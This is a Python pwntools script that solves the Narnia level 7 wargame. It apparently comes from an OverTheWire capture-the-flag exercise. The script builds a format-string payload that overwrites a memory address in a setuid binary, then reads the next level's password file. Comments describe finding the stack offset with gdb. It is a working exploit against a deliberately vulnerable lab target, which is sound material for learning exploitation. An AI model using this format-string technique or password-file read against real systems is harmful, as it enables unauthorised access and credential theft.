from pwn import *

payload = fmtstr_payload(2, {0xffffd608 : 0x8048724})

p = process([b'/narnia/narnia7', payload])
p.recvuntil(b'Way to go!!!!')
p.sendline(b'cat /etc/narnia_pass/narnia8')
print('\nnarnia8 pass: ' + p.recvline().decode())

p.close()

# on this, found the offset by running gdb
# setting a breakpoint immediately after the print function
# running with ABCD.%x.%x.%x.%x.%x
# finding the print function after esp, e.g. via x/20wx $esp (looking for 44434241)
# reading the buffer as if it was a string via x/s $esp+16 (which was where i found it)
# this showed a result like ABCD.80486ff.44434241.3430382e.66663638.3434342e., which showed the buffer was in position 2